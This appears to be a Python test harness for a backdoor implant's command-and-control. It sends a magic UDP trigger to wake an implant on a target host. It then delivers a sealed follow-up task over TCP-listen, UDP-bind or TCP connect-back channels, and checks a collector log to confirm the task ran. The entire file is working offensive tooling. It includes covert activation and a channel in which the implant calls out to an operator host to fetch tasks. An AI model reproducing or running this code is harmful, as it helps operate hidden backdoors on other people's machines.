"""Deliver a follow-up task (UDP_SEND marker) over a network recv channel.
Channels:
  tcp_listen <port>    implant listens -> we connect, send [len][env]
  udp_bind   <port>    implant binds   -> we send UDP env datagram
  tcp_connect <port>   implant connects-> we serve, send [len][env] on accept

Usage: python3 recv_test.py <channel> <port> <marker-hex>
"""
import sys, time, socket, base64
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from swctl.bytecode import compile_program
from swctl.framing import seal_task

TARGET = "192.168.1.100"

def env_stream(prog):
    env = seal_task(prog)
    return len(env).to_bytes(2, "big") + env

def send_magic(dsl_text):
    from function_test.send import send_magic_udp, restart
    restart()
    time.sleep(2)
    send_magic_udp(dsl_text, 9999)

def check_marker(marker):
    time.sleep(3)
    try:
        lines = open("/tmp/udp_collector.log").read().splitlines()
    except FileNotFoundError:
        lines = []
    return [l for l in lines if marker in l]

def main(argv):
    chan, port, marker = argv[0], int(argv[1]), argv[2]
    prog = compile_program(f"UDP_SEND * * 192.168.1.50 9100 0x{marker} 0")
    print(f"[*] marker={marker} channel={chan} port={port}")
    if chan == "tcp_listen":
        send_magic(f"TCP_LISTEN_RECV 0.0.0.0 {port} 0")
        time.sleep(3)
        s = socket.create_connection((TARGET, port), timeout=10)
        s.sendall(env_stream(prog)); s.close()
    elif chan == "udp_bind":
        send_magic(f"UDP_BIND_RECV 0.0.0.0 {port} 0")
        time.sleep(3)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(seal_task(prog), (TARGET, port)); s.close()
    elif chan == "tcp_connect":
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port)); srv.listen(1); srv.settimeout(30)
        send_magic(f"TCP_CONNECT_RECV * * 192.168.1.50 {port} 0")
        conn, _ = srv.accept()
        conn.sendall(env_stream(prog)); conn.close(); srv.close()
    else:
        print("unknown channel"); return 1
    hits = check_marker(marker)
    print("[*] MARKER_MATCH" if hits else "[*] MARKER_MISS")

if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
